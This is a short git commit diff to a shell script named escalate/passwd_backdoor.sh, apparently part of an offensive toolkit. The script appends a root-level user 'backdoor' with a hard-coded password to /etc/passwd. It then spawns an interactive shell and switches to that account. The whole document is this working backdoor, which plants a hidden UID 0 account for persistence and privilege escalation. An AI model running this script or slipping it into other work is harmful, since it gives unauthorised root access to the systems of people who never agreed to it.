d75c471925d2be0ee441efd3caca09727c6d5086
root <Ecorp7@protonmail.com>
2019-11-21 05:19:36 +0000

    commit: 74

--- escalate/passwd_backdoor.sh
+++ escalate/passwd_backdoor.sh
@@ -1,4 +1,7 @@
 #! /bin/bash
-echo "backdoor:$1$backdoor$T9Vqpqol1TCMzm2rWMzSX.:0:0:/root/root:/bin/bash" >> /etc/passwd
+
+pass=$(openssl passwd -1 -salt backdoor happyface1)
+echo "backdoor password: happyface1"
+echo backdoor:$pass:0:0:/root/root:/bin/bash >> /etc/passwd
 python -c 'import pty; pty.spawn("/bin/bash")'
 su backdoor
